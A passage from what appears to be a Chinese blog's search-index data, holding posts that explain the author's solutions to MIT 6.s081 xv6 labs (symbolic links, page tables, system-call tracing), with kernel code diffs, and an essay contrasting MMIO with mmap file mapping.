MAXPATH)) &lt; 0 || (n2 = argstr(1, path, MAXPATH)) &lt; 1) &#123;        return -1;    &#125;    begin_op();    // create symbol link in the path    if ((ip = create(path, T_SYMLINK, 0, 0)) == 0) &#123;        end_op();        return -1;    &#125;    // write target to file that ip points to    if (writei(ip, 0, (uint64)target, 0, n1) &lt; n1) &#123;        end_op();        return -1;    &#125;    iunlockput(ip);    end_op();    return 0;&#125;\n实现了符号链接的创建之后，还需要修改 sys_open()，实现对符号链接的特殊处理：当该文件是一个符号链接并且需要以跟随（follow）的方式打开时，就不断向下递归，将当前的 inode 指针指向符号链接指向文件的 inode，直到 inode 指针对应的文件类型不是符号链接，此时该 inode 指针指向的文件才是本次 sys_open() 系统调用实际需要打开的文件。\n这里要用到两个关键函数 readi() 和 namei()。其中 readi() 能够根据 inode 指针，从该 inode 指针对应的文件中读取数据；而 namei() 能够根据指定的路径，返回该路径对应文件的 inode 指针。“跟随”的基本流程就是先使用读取当前 inode 中的数据，即目标文件路径 path，再将当前 inode 指针指向 path 目录对应的文件，以此往复。\n最后还有一个小细节，就是当多个符号链接形成一个环时，这样的“跟随”过程就可能会导致死循环，因此必须加以限制，这里为了实现的方便，只是设定了一个最大递归深度，当递归深度超过该设定最大值时，文件打开就会失败。\nif (!(omode &amp; O_NOFOLLOW)) &#123;    int depth = 10;     // max recursive depth    struct inode *next; // next inode    while (depth &gt; 0 &amp;&amp; ip-&gt;type == T_SYMLINK) &#123;        // read data from file that ip points to to path        if (readi(ip, 0, (uint64)path, 0, MAXPATH) == 0) &#123;            iunlockput(ip);            end_op();            return -1;        &#125;        // get inode of file in the path        if ((next = namei(path)) == 0) &#123;            iunlockput(ip);            end_op();            return -1;        &#125;        iunlockput(ip);        ip = next;        --depth;        ilock(ip);    &#125;    if (depth &lt;= 0) &#123;        iunlockput(ip);        end_op();        return -1;    &#125;&#125;\n代码diff --git a/Makefile b/Makefileindex 7a7e380..37a202c 100644--- a/Makefile+++ b/Makefile@@ -188,6 +188,7 @@ UPROGS=\\ \t$U/_grind\\ \t$U/_wc\\ \t$U/_zombie\\+\t$U/_symlinktest\\   diff --git a/kernel/fcntl.h b/kernel/fcntl.hindex 44861b9..b42df18 100644--- a/kernel/fcntl.h+++ b/kernel/fcntl.h@@ -3,3 +3,4 @@ #define O_RDWR    0x002 #define O_CREATE  0x200 #define O_TRUNC   0x400+#define O_NOFOLLOW 0x800\\ No newline at end of filediff --git a/kernel/stat.h b/kernel/stat.hindex 19543af..46ba47f 100644--- a/kernel/stat.h+++ b/kernel/stat.h@@ -1,6 +1,7 @@ #define T_DIR     1   // Directory #define T_FILE    2   // File #define T_DEVICE  3   // Device+#define T_SYMLINK 4   // Symbol link  struct stat &#123;   int dev;     // File system&#x27;s disk devicediff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..1697b62 100644--- a/kernel/syscall.c+++ b/kernel/syscall.c@@ -104,6 +104,7 @@ extern uint64 sys_unlink(void); extern uint64 sys_wait(void); extern uint64 sys_write(void); extern uint64 sys_uptime(void);+extern uint64 sys_symlink(void);  static uint64 (*syscalls[])(void) = &#123; [SYS_fork]    sys_fork,@@ -127,6 +128,7 @@ static uint64 (*syscalls[])(void) = &#123; [SYS_link]    sys_link, [SYS_mkdir]   sys_mkdir, [SYS_close]   sys_close,+[SYS_symlink] sys_symlink, &#125;;  voiddiff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..0fbf6ed 100644--- a/kernel/syscall.h+++ b/kernel/syscall.h@@ -20,3 +20,4 @@ #define SYS_link   19 #define SYS_mkdir  20 #define SYS_close  21+#define SYS_symlink 22\\ No newline at end of filediff --git a/kernel/sysfile.c b/kernel/sysfile.cindex 5dc453b..ae342c8 100644--- a/kernel/sysfile.c+++ b/kernel/sysfile.c@@ -15,6 +15,7 @@ #include &quot;sleeplock.h&quot; #include &quot;file.h&quot; #include &quot;fcntl.h&quot;+#include &quot;buf.h&quot;  // Fetch the nth word-sized system call argument as a file descriptor // and return both the descriptor and the corresponding struct file.@@ -316,6 +317,35 @@ sys_open(void)     &#125;   &#125; +  if (!(omode &amp; O_NOFOLLOW)) &#123;+    int depth = 10;+    struct inode *next;++    while (depth &gt; 0 &amp;&amp; ip-&gt;type == T_SYMLINK) &#123;+      if (readi(ip, 0, (uint64)path, 0, MAXPATH) == 0) &#123;+        iunlockput(ip);+        end_op();+        return -1;+      &#125;++      if ((next = namei(path)) == 0) &#123;+        iunlockput(ip);+        end_op();+        return -1;+      &#125;+      iunlockput(ip);+      ip = next;+      --depth;+      ilock(ip);+    &#125;++    if (depth &lt;= 0) &#123;+      iunlockput(ip);+      end_op();+      return -1;+    &#125;+  &#125;+   if(ip-&gt;type == T_DEVICE &amp;&amp; (ip-&gt;major &lt; 0 || ip-&gt;major &gt;= NDEV))&#123;     iunlockput(ip);     end_op();@@ -484,3 +514,28 @@ sys_pipe(void)   &#125;   return 0; &#125;++uint64 sys_symlink(void) &#123;+  int n1, n2;+  char target[MAXPATH], path[MAXPATH];+  struct inode *ip;++  if ((n1 = argstr(0, target, MAXPATH)) &lt; 0 || (n2 = argstr(1, path, MAXPATH)) &lt; 1) &#123;+    return -1;+  &#125;+  +  // create symbol link in the path+  begin_op();+  if ((ip = create(path, T_SYMLINK, 0, 0)) == 0) &#123;+    end_op();+    return -1;+  &#125;+  if (writei(ip, 0, (uint64)target, 0, n1) &lt; n1) &#123;+    end_op();+    return -1;+  &#125;+  iunlockput(ip);+  end_op();++  return 0;+&#125;\\ No newline at end of filediff --git a/user/user.h b/user/user.hindex b71ecda..883ef48 100644--- a/user/user.h+++ b/user/user.h@@ -23,6 +23,7 @@ int getpid(void); char* sbrk(int); int sleep(int); int uptime(void);+int symlink(char *, char *);  // ulib.c int stat(const char*, struct stat*);diff --git a/user/usys.pl b/user/usys.plindex 01e426e..65a8d6b 100755--- a/user/usys.pl+++ b/user/usys.pl@@ -36,3 +36,4 @@ entry(&quot;getpid&quot;); entry(&quot;sbrk&quot;); entry(&quot;sleep&quot;); entry(&quot;uptime&quot;);+entry(&quot;symlink&quot;);\\ No newline at end of file\n","categories":["操作系统"],"tags":["操作系统","经验","xv6"]},{"title":"MMIO和mmap文件映射的区别","url":"/2025/05/16/MMIO%E5%92%8Cmmap%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"MMIO 和 mmap 文件映射都涉及将外部资源（除 CPU 寄存器和内存以外）映射到进程的地址空间中，但它们并非等同。本文将对二者进行分别介绍，并对比它们之间的区别和联系。\n\nMMIO计算机系统中的设备种类繁多，不同设备它们的物理结构、电气特性可能完全不同。因此为了屏蔽其中的差异，让 CPU 更好的与不同的设备进行交互，各种不同的设备都被抽象成了一系列的外部接口，也就是 设备寄存器 。CPU 与设备交互的方式，就是对这些寄存器进行读写。\n那么问题自然应运而生，以什么样的方式，或者更具体地说，执行什么样的指令对设备寄存器进行读写？通常来说有两种：一种是 CPU 采用特殊的 I/O 指令（如 x86 架构下的 in/out 指令），指令中对应的设备寄存器地址位于一片专门的 I/O 地址空间中，这种方式成为端口映射 I/O（Port-Mapped I/O, PMIO）；而另一种则是将设备寄存器的地址映射到进程的虚拟地址空间中，进而直接使用普通的内存读写指令（如 x86 架构下的 mov）对其进行读写，这种方式称为内存映射 I/O（Memory-Mapped I/O），也就是本文要介绍的 MMIO。\n在 Linux 内核驱动代码中，通常使用 ioremap 来进行 MMIO 的映射：\nvoid __iomem *regs = ioremap(phys_addr, size);// 写入硬件寄存器writel(value, regs + offset);\nmmap 文件映射\n属于 MMIO 的一种？《UNIX 环境高级编程 p422》\n\nmmap 是一个类 UNIX 系统中常见的系统调用接口，用于向进程的地址空间中新增一段虚拟内存段，其声明如下：\nvoid *mmap(void *addr, size_t len, int prot, int flag, int fd, off_t off);\n如果指定了 fd 参数（fd 不为 -1），那么 fd 所指向的文件将会从 off 偏移量的位置开始映射一段长度为 len 的数据内容到地址空间中，对文件的读写可以直接转换为对被映射内存地址的读写。当然这个过程通常带有 lazy 的策略，即只有实际读取时才进行加载。示例代码如下：\nint fd = open(&quot;data.txt&quot;, O_RDWR);void *addr = mmap(NULL, length, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);// 直接通过指针读写文件内容memcpy(addr, buffer, length);\n二者的区别和联系可以看到，二者在使用上的区别还是很显著的。mmap 操作的是持久化的存储（文件），目的是方便对文件数据的读写；MMIO 操作的是硬件行为，目的是控制设备的状态。\n但是我在阅读《UNIX 环境高级编程：第 3 版》（下面简称 APUE）第 14.8 节——存储映射 I/O 时，其中介绍的内容正是 mmap 接口。实际上，APUE 中所描述的 MMIO，指的应该是 广义上 的 MMIO —— 即通过内存地址实现 I/O 操作。将存储在磁盘中的文件映射到地址空间中，其实也是在将磁盘的某些扇区映射到地址空间中，那么对这些地址的写入，最终也会转换为对文件的写入（如果使用 MAP_SHARED 映射类型），对文件的写入，需要通过调用磁盘驱动程序来对更改磁盘上指定的比特位，借此实现持久化，这其实也是在更改设备的状态。从这个角度来看，mmap 文件映射也是 MMIO 的一种。\n最后总结，MMIO 更多是一种理念，是 UNIX 哲学 —— “将复杂操作统一到通用抽象”的延续。\n","categories":["操作系统"],"tags":["操作系统","虚拟内存","I/O"]},{"title":"MIT6.s081 2021 Lab Page tables","url":"/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/","content":"Speed up system calls思路题目要求在每个进程初始化时为它的页表插入一个页表项，内核通过这样预先缓存页表项的操作，来加速特定系统调用的执行速度。\n由于前不久刚过完一遍《OSTEP》，因此我认为自己对页表机制还算比较熟悉，应对本 Lab 理应比较轻松，但在真正上手的时候，还是觉得有些无所适从，无奈老老实实地把 xv6 手册的第 3 章对照着代码仔细研读了一番，从中提炼出了几个关键的函数：\n\nkernel/kalloc.c:kalloc\n\nvoid *kalloc(void);\n遍历空闲链表，寻找一个可分配的物理页面。若找到，返回该页面的首（物理）地址；否则，返回 0 （空指针）。\n\nkernel/kalloc.c:kfree\n\nvoid kfree(void *pa);\n释放已分配的首地址为 pa 的物理页面，并更新空闲链表。\n\nkernel/proc.c:allocproc\n\nstatic struct proc *allocproc(void);\n遍历进程数组 proc，寻找未被使用的 struct proc。若找到，则初始化其状态，为创建一个新的页表，并返回指向它的指针；否则，返回 0（空指针）。\n\nkernel/proc.c:freeproc\n\nstatic void freeproc(struct proc *p);\n释放与进程 p 相关的数据的内存空间，并清空 p 的 struct proc 的所有信息。\n\nkernel/vm.c:mappages\n\nint mappages(pagetable_t pagetable, uint64 va, uint64 size, uint64 pa, int perm);\n在页表 pagetrable 中创建从起始虚拟地址 va 到起始物理地址 pa 的页表项映射，页表项的 flags 位的访问权限部分设置为 perm，其中大小为 size，将 size 分为若干页，为这些页面创建 va + i * PGSIZE -&gt; pa + i * PGSIZE （i 代表页面的编号）的映射。\n\nkernel/vm.c:uvmunmap\n\nvoid uvmunmap(pagetable_t pagetable, uint64 va, uint64 npages, int do_free);\n从 pagetable 中移除从虚拟地址 va 开始的 npages 个页表项。可指定 do_free 的值，若不为 0，则在移除页表项的同时，释放页表项映射 va -&gt; pa 中 pa 指向的内存空间。 \n分析完几个关键函数之后，思路就比较清晰了：\n\n为 struct proc 结构体添加 struct usyscall *usc 段。\n在 allocproc() 中为 usc 分配物理内存，并对其赋值：p-&gt;usc-&gt;pid = p-&gt;pid;。\n\nif ((p-&gt;usc = (struct usyscall *)kalloc()) == 0) &#123;\tfreeproc(p);\trelease(&amp;p-&gt;lock);\treturn 0;&#125;p-&gt;usc-&gt;pid = p-&gt;pid;\n\n在 freeproc() 中释放 usc 的物理内存。\n\nif (p-&gt;usc)\tkfree((void*)p-&gt;usc);p-&gt;usc = 0;\n\n在 proc_pagetable() 中使用 mappages 插入虚拟地址 USYSCALL 的页表项。\n\nif (mappages(pagetable, USYSCALL, PGSIZE, (uint64)(p-&gt;usc), PTE_R | PTE_U) &lt; 0) &#123;  \tuvmunmap(pagetable, TRAMPOLINE, 1, 0);\tuvmunmap(pagetable, TRAPFRAME, 1, 0);\tuvmfree(pagetable, 0);\treturn 0;&#125;\n\n最后，非常容易忽视的，在 proc_freepagetable() 中删除虚拟地址 USYSCALL 的页表项。\n\nuvmunmap(pagetable, USYSCALL, 1, 0);\n问题接下来讲讲我在本题遇到的几个问题。\n问题 1：\n\n原因： p-&gt;usc-&gt;pid = p-&gt;pid 放在分配物理内存之前，导致空指针解引用。\n问题 2：\n\n原因： 未在 proc_freepagetable() 中解除 USYSCALL 的页表项映射，也就是上面提到的容易忽视的第 5 点。\n代码diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..5fc573f 100644--- a/kernel/proc.c+++ b/kernel/proc.c@@ -127,6 +127,14 @@ found:     return 0;   &#125; +  // here+  if ((p-&gt;usc = (struct usyscall *)kalloc()) == 0) &#123;+\tfreeproc(p);+\trelease(&amp;p-&gt;lock);+\treturn 0;+  &#125;+  p-&gt;usc-&gt;pid = p-&gt;pid;+   // An empty user page table.   p-&gt;pagetable = proc_pagetable(p);   if(p-&gt;pagetable == 0)&#123;@@ -153,6 +161,9 @@ freeproc(struct proc *p)   if(p-&gt;trapframe)     kfree((void*)p-&gt;trapframe);   p-&gt;trapframe = 0;+  if (p-&gt;usc) // here+\tkfree((void*)p-&gt;usc);+  p-&gt;usc = 0;   if(p-&gt;pagetable)     proc_freepagetable(p-&gt;pagetable, p-&gt;sz);   p-&gt;pagetable = 0;@@ -195,6 +206,14 @@ proc_pagetable(struct proc *p)     uvmfree(pagetable, 0);     return 0;   &#125;+  +  // here+  if (mappages(pagetable, USYSCALL, PGSIZE, (uint64)(p-&gt;usc), PTE_R | PTE_U) &lt; 0) &#123;  +\tuvmunmap(pagetable, TRAMPOLINE, 1, 0);+\tuvmunmap(pagetable, TRAPFRAME, 1, 0);+\tuvmfree(pagetable, 0);+\treturn 0;+  &#125;    return pagetable; &#125;@@ -206,6 +225,7 @@ proc_freepagetable(pagetable_t pagetable, uint64 sz) &#123;   uvmunmap(pagetable, TRAMPOLINE, 1, 0);   uvmunmap(pagetable, TRAPFRAME, 1, 0);+  uvmunmap(pagetable, USYSCALL, 1, 0); // here   uvmfree(pagetable, sz); &#125; diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..d25a729 100644--- a/kernel/proc.h+++ b/kernel/proc.h@@ -82,6 +82,8 @@ struct trapframe &#123;  enum procstate &#123; UNUSED, USED, SLEEPING, RUNNABLE, RUNNING, ZOMBIE &#125;; +struct usyscall;+ // Per-process state struct proc &#123;   struct spinlock lock;@@ -105,4 +107,7 @@ struct proc &#123;   struct file *ofile[NOFILE];  // Open files   struct inode *cwd;           // Current directory   char name[16];               // Process name (debugging)+  +  // here+  struct usyscall *usc; &#125;;\nPrint a page table思路仿照 freewalk 函数的写法，递归查找所有有效的页表项，并根据题干要求打印相关信息。涉及的内容较少，如果认真把上面提到的几个关键函数理清楚，并且理解了多级页表的机制，写起来还是比较轻松的，流程如下：\n遍历当前页表中的所有页表项，如果页表项有效（flags 的有效位为 1），则将该页表项转换为物理地址向下递归搜索。需要注意的是在递归查找到第 3 级页表时，就不能继续向下递归了，此时得到的 pa 就是进行虚实地址转换后的物理地址。\n代码diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..d169300 100644--- a/kernel/defs.h+++ b/kernel/defs.h@@ -170,6 +170,7 @@ uint64          walkaddr(pagetable_t, uint64); int             copyout(pagetable_t, uint64, char *, uint64); int             copyin(pagetable_t, char *, uint64, uint64); int             copyinstr(pagetable_t, char *, uint64, uint64);+void            vmprint(pagetable_t); // here  // plic.c void            plicinit(void);diff --git a/kernel/exec.c b/kernel/exec.cindex d62d29d..89f3d74 100644--- a/kernel/exec.c+++ b/kernel/exec.c@@ -115,6 +115,11 @@ exec(char *path, char **argv)   p-&gt;trapframe-&gt;epc = elf.entry;  // initial program counter = main   p-&gt;trapframe-&gt;sp = sp; // initial stack pointer   proc_freepagetable(oldpagetable, oldsz);+  +  // here+  if(p-&gt;pid == 1) &#123;+\tvmprint(p-&gt;pagetable);+  &#125;    return argc; // this ends up in a0, the first argument to main(argc, argv) diff --git a/kernel/vm.c b/kernel/vm.cindex d5a12a0..23eeec9 100644--- a/kernel/vm.c+++ b/kernel/vm.c@@ -432,3 +432,25 @@ copyinstr(pagetable_t pagetable, char *dst, uint64 srcva, uint64 max)     return -1;   &#125; &#125;++// here+void vmprint_recur(pagetable_t pagetable, int depth) &#123;+\tfor (int i = 0; i &lt; 512; ++i) &#123;+\t\tpte_t pte = pagetable[i];+\t\tif (pte &amp; PTE_V) &#123; // pte is valid+\t\t\tfor (int j = 0; j &lt; depth; ++j) &#123;+\t\t\t\tprintf(&quot; ..&quot;);+\t\t\t&#125;+\t\t\tuint64 child = PTE2PA(pte);+\t\t\tprintf(&quot;%d: pte %p pa %p\\n&quot;, i, pte, child);+\t\t\tif (depth &lt; 3) &#123;+\t\t\t\tvmprint_recur((pagetable_t)child, depth + 1);\t+\t\t\t&#125;+\t\t&#125;+\t&#125;+&#125;++void vmprint(pagetable_t pagetable) &#123;+\tprintf(&quot;page table %p\\n&quot;, pagetable);+\tvmprint_recur(pagetable, 1);+&#125;\nDetecting which pages have been accessed思路题目要求实现一个系统调用 sys_pgaccess()，获取指定虚拟页面的最近被访问信息。\n算是一个大杂烩的题，把 Lab System calls 的内容和 pagetable 结合起来，不要被 hard 难度标签吓到了，只要前面的 Lab 全都认真完成，再运用一些位运算的技巧，本题其实并不 “hard”。\n所有的系统调用需要的声明已经实现添加好了，我们只需要关注 sys_pgaccess() 的实现即可，基本流程如下：\n\n和 Lab System calls 一样，使用 argint() 和 argaddr() 获取用户空间传递的参数：base、len、mask。\n函数体内定义一个 kmask，作为 mask 的缓冲区。\n从地址 base 开始遍历连续的 len 的页面，获取该页面的页表项 pte，根据 pte 的访问位对 kmask 进行置位，注意不要忘了每次遍历后将 pte 的访问位置 0。\n遍历完成后，使用 copyout() 将 kmask 的数据存入用户空间 mask 处。\n\n有一个值得注意的问题，根据提示：\n\nIt’s okay to set an upper limit on the number of pages that can be scanned.\n\n可以设定一个最大扫描范围，这主要根据 kmask 的数据类型而定，这里我选择使用 long 类型，那么最大扫描范围自然就是 64（long 类型为 8 字节大小，64 bit）。\n同时，在对 kmask 操作时，可以运用一些位运算的技巧：\n首先可以将 kmask 置为 0（二进制位全为 0），如果页面 i 的访问位为 1，则使用 kmask |= (1 &lt;&lt; i)，将 kmask 第 i 位置为 1 而不影响其它位（0 | 0 = 0; 1 | 0 = 1）。\n要清除 pte 的访问位，可使用 *pte &amp;= ~PTE_A，其中 PTE_A = 1L &lt;&lt; 6，即访问位为 1，其它位都为 0，取反后，访问位为 0，其它位都为 1，与其进行按位与运算可将访问位置为 0，而不影响其它位（0 &amp; 1 = 0; 1 &amp; 1 = 1）。\n问题问题 1：\n\n原因： 比较坑的一个问题，原因是 kernel/defs.h 中没有 walk 函数声明，需要手动添加。\n代码diff --git a/kernel/defs.h b/kernel/defs.hindex d169300..53f1f88 100644--- a/kernel/defs.h+++ b/kernel/defs.h@@ -171,6 +171,7 @@ int             copyout(pagetable_t, uint64, char *, uint64); int             copyin(pagetable_t, char *, uint64, uint64); int             copyinstr(pagetable_t, char *, uint64, uint64); void            vmprint(pagetable_t); // here+pte_t \t\t\t*walk(pagetable_t, uint64, int);  // plic.c void            plicinit(void);diff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..6b130fe 100644--- a/kernel/riscv.h+++ b/kernel/riscv.h@@ -343,6 +343,7 @@ sfence_vma() #define PTE_W (1L &lt;&lt; 2) #define PTE_X (1L &lt;&lt; 3) #define PTE_U (1L &lt;&lt; 4) // 1 -&gt; user can access+#define PTE_A (1L &lt;&lt; 6) // access bit  // shift a physical address to the right place for a PTE. #define PA2PTE(pa) ((((uint64)pa) &gt;&gt; 12) &lt;&lt; 10)diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex 3bd0007..359847c 100644--- a/kernel/sysproc.c+++ b/kernel/sysproc.c@@ -81,6 +81,36 @@ int sys_pgaccess(void) &#123;   // lab pgtbl: your code here.+  struct proc *p = myproc();+  void *base, *mask;+  long kmask; // buffer+  int len;+  pte_t *pte;+  +  if (argaddr(0, (uint64 *)&amp;base) &lt; 0) &#123;+\treturn -1;+  &#125;+  if (argint(1, &amp;len) &lt; 0 || len &gt; 64) &#123; // page limited to 64+\treturn -1;+  &#125;+  if (argaddr(2, (uint64 *)&amp;mask) &lt; 0) &#123;+\treturn -1;+  &#125;+  +  kmask = 0L; // initialize bitmask to zero+  for (int i = 0; i &lt; len; ++i) &#123;+\tuint64 va = (uint64)(base + i * PGSIZE);+\tpte = walk(p-&gt;pagetable, va, 0);+\tif (*pte &amp; PTE_A) &#123; // pte was accessed recently+\t  kmask |= (1 &lt;&lt; i);+\t&#125;+\t*pte &amp;= ~PTE_A; // clear access bit+  &#125;+  +  if (copyout(p-&gt;pagetable, (uint64)mask, (char *)&amp;kmask, 8) &lt; 0) &#123;+\treturn -1;+  &#125;+   return 0; &#125; #endif\n","categories":["操作系统"],"tags":["操作系统","经验","xv6"]},{"title":"MIT6.s081 2021 Lab System calls","url":"/2024/06/27/MIT6.s081-2021-Lab%20System%20calls/","content":"xv6系统调用实现不同于 Lab1 利用已实现的系统调用来实现一些用户态下的命令行程序，本 Lab 是要在内核层面实现一些系统调用。这其中难免涉及到一些对内核数据结构的操作，以及处理器体系结构（本系列 Lab 基于 RISCV）相关的内容，那么首先有必要梳理一下 xv6 下系统调用的实现过程。\nxv6 系统调用的实现：\n\n以 trace 系统调用为例，用户通过调用 user/user.h 中的函数 trace 进行系统调用。\n通过调用 Perl 脚本 user/usys.pl 生成的一系列汇编代码，该汇编代码的作用是设置寄存器的内容并实现用户态到内核态的切换，内核后续针对寄存器中的内容执行相应的系统调用操作。以下是对 user/usys.pl 代码的逐行解析：\n\n\n\n#!/usr/bin/perl -w：这是一个Perl脚本的“shebang”行，指定使用/usr/bin/perl解释器执行此脚本，并开启警告（-w）选项。\n\nprint &quot;# generated by usys.pl - do not edit\\n&quot;;：打印注释说明此文件是由usys.pl脚本自动生成的，不应手动编辑。\n\nprint &quot;#include \\&quot;kernel/syscall.h\\&quot;\\n&quot;;：输出一条预处理器指令，包含一个名为syscall.h的头文件，该文件可能包含了系统调用相关的常量和宏定义。\n\nsub entry {...}：定义了一个名为entry的子程序（函数），它接受一个参数（系统调用名称）。\n\nmy $name = shift;：在entry函数内部，使用shift函数获取传入的第一个参数（系统调用名称），并将其存储在变量$name中。\n\n接下来的几行print语句构造了每个系统调用存根的汇编代码：\n\n.global $name：声明一个全局标签（函数名），使得链接器能够找到它。\n${name}:\\n：定义了一个标签，对应于系统调用函数的开始。\nli a7, SYS_${name}\\n：装载（load immediate）指令，将系统调用号（通过宏SYS_${name}得到）放入寄存器a7中。在RISC-V架构中，a7寄存器通常用于存放系统调用号。\necall：执行系统调用指令，这会触发处理器进入内核模式并执行相应的内核服务。\nret：返回指令，从系统调用中返回到用户程序。\n\n\n最后，脚本通过多次调用entry函数（传入不同的系统调用名称，如fork, exit, wait等），为每一个列出的系统调用生成对应的汇编代码存根。\n\n\n\n\n内核在执行系统调用时，只是调用 kernel/syscall.c 中的 syscall 函数，该函数读取寄存器 a7 的值，将其作为系统调用号，执行实际的系统调用函数（如sys_trace），并将函数返回值放入寄存器 a0 中，调用结束。\n\nSystem call tracing思路理解了上述的系统调用过程，就可以开始着手完成系统调用的添加了。\n由题干可知，用户态系统调用函数 trace 的参数为一个整型 mask，该 mask 用来表示哪些系统调用需要被追踪，如果 mask 的第 i 位为 1，则系统调用号 i 对应的系统调用将被追踪。\n首先，在 user/user.h、user/usys.pl 和 kernel/syscall.h 中添加 trace 的声明。\n接下来，在 kernel/sysproc.c 中实现系统调用函数 sys_trace，该函数获取用户态传递的 trace 函数的参数 mask，并存入当前进程的 PCB（进程控制块，xv6 中为 kernel/proc.h 中的 struct proc 结构体）中。获取参数的操作，可以查看如下 xv6 文档的描述，并参考 kernel/sysproc.c 中其它系统调用函数的实现。由于参数类型为整型且数量只有一个（存放在 a0 寄存器中），因此调用 argint(0, &amp;(myproc()-&gt;mask))。另外需要注意的是，struct proc 的初始定义中并没有 mask 段的内容，需要自行添加。\n\nBecause user code calls system call wrapper functions, the arguments are initially where the RISC-V C calling convention places them: in registers. The kernel trap code saves user registers to the current process’s trap frame, where kernel code can find them. The kernel functions argint, argaddr, and argfd retrieve the n ’th system call argument from the trap frame as an integer, pointer, or a file descriptor. They all call argraw to retrieve the appropriate saved user register (kernel/syscall.c:35).\n\n然后，修改 kernel/proc.c 中 fork 函数的定义，为 mask 字段添加拷贝操作，将父进程的 mask 字段传递给子进程，以此实现对子进程的追踪。\nnp-&gt;mask = p-&gt;mask;\n最后，修改 kernel/syscall.c 中的 syscall 函数，判断当前的系统调用号是否位于被追踪的范围内，如果是，则按照要求格式将要追踪的信息打印出来：其中进程号为 myproc()-&gt;pid；函数调用名可手动创建一个系统调用名称表，通过将系统调用号作为下标来获取；函数返回值位于寄存器 a0 中，可通过 myproc()-&gt;trapframe-&gt;a0 来获取。\n问题最后再记录一下本 Lab 遇到的一些问题：\nmake失败\n被这个错误困扰了挺久，甚至还为此使用 git reset 回退了版本，最后发现是在 $U/_trace\\ 的末尾多了一个空格。。。\n系统调用名称表添加出错\n原因是我将系统调用名称表添加在了 kernel/syscall.h 中，但该头文件后续是会被 user/usys.pl 用于生成汇编的，因此不能包含 C 语言语句，最后是选择直接添加在了 kernel/syscall.c 中。\n代码由于本 Lab 主要是在原先的内核代码上进行修改，涉及的文件较多，因此代码部分以 git diff 的形式展现。\ndiff --git a/Makefile b/Makefileindex c926b7e..6647da5 100644--- a/Makefile+++ b/Makefile@@ -193,6 +193,7 @@ UPROGS=\\ \t$U/_grind\\ \t$U/_wc\\ \t$U/_zombie\\+\t$U/_trace\\   diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..f4bd5c2 100644--- a/kernel/proc.c+++ b/kernel/proc.c@@ -314,6 +314,9 @@ fork(void)   acquire(&amp;np-&gt;lock);   np-&gt;state = RUNNABLE;   release(&amp;np-&gt;lock);+  +  // here+  np-&gt;mask = p-&gt;mask;    return pid; &#125;diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..e83d456 100644--- a/kernel/proc.h+++ b/kernel/proc.h@@ -105,4 +105,7 @@ struct proc &#123;   struct file *ofile[NOFILE];  // Open files   struct inode *cwd;           // Current directory   char name[16];               // Process name (debugging)+  +  // here+  int mask;\t\t\t\t\t   // Mask of trace &#125;;diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..b5b8291 100644--- a/kernel/syscall.c+++ b/kernel/syscall.c@@ -104,6 +104,7 @@ extern uint64 sys_unlink(void); extern uint64 sys_wait(void); extern uint64 sys_write(void); extern uint64 sys_uptime(void);+extern uint64 sys_trace(void);  static uint64 (*syscalls[])(void) = &#123; [SYS_fork]    sys_fork,@@ -127,6 +128,16 @@ static uint64 (*syscalls[])(void) = &#123; [SYS_link]    sys_link, [SYS_mkdir]   sys_mkdir, [SYS_close]   sys_close,+[SYS_trace]   sys_trace,+&#125;;++// here+static char *syscall_names[] = &#123;\t+\t&quot;dummy&quot;,  &quot;fork&quot;,  &quot;exit&quot;,  &quot;wait&quot;,  &quot;pipe&quot;,+\t&quot;read&quot;,   &quot;kill&quot;,  &quot;exec&quot;,  &quot;fstat&quot;, &quot;chdir&quot;,+\t&quot;dup&quot;,    &quot;getpid&quot;,&quot;sbrk&quot;,  &quot;sleep&quot;, &quot;uptime&quot;,+\t&quot;open&quot;,   &quot;write&quot;, &quot;mknod&quot;, &quot;unlink&quot;, &quot;link&quot;,+\t&quot;mkdir&quot;,  &quot;close&quot;, &quot;trace&quot;, &#125;;  void@@ -138,6 +149,11 @@ syscall(void)   num = p-&gt;trapframe-&gt;a7;   if(num &gt; 0 &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;     p-&gt;trapframe-&gt;a0 = syscalls[num]();+\t+\t// here+\tif (p-&gt;mask &amp; (1 &lt;&lt; num)) &#123;  // if mask contains current syscall num+\t\tprintf(&quot;%d: syscall %s -&gt; %d\\n&quot;, p-&gt;pid, syscall_names[num], p-&gt;trapframe-&gt;a0);+\t&#125;   &#125; else &#123;     printf(&quot;%d %s: unknown sys call %d\\n&quot;,             p-&gt;pid, p-&gt;name, num);diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..756d191 100644--- a/kernel/syscall.h+++ b/kernel/syscall.h@@ -20,3 +20,4 @@ #define SYS_link   19 #define SYS_mkdir  20 #define SYS_close  21+#define SYS_trace  22 // here\\ No newline at end of filediff --git a/kernel/sysproc.c b/kernel/sysproc.cindex e8bcda9..3ff51d9 100644--- a/kernel/sysproc.c+++ b/kernel/sysproc.c@@ -95,3 +95,11 @@ sys_uptime(void)   release(&amp;tickslock);   return xticks; &#125;++// here+uint64 sys_trace(void) &#123;+\tif (argint(0, &amp;(myproc()-&gt;mask)) &lt; 0) &#123;+\t\treturn -1;+\t&#125;+\treturn 0;+&#125;\\ No newline at end of filediff --git a/user/user.h b/user/user.hindex b71ecda..16107d6 100644--- a/user/user.h+++ b/user/user.h@@ -23,6 +23,7 @@ int getpid(void); char* sbrk(int); int sleep(int); int uptime(void);+int trace(int); // here  // ulib.c int stat(const char*, struct stat*);diff --git a/user/usys.pl b/user/usys.plindex 01e426e..76c64ec 100755--- a/user/usys.pl+++ b/user/usys.pl@@ -36,3 +36,4 @@ entry(&quot;getpid&quot;); entry(&quot;sbrk&quot;); entry(&quot;sleep&quot;); entry(&quot;uptime&quot;);+entry(&quot;trace&quot;); # here\\ No newline at end of 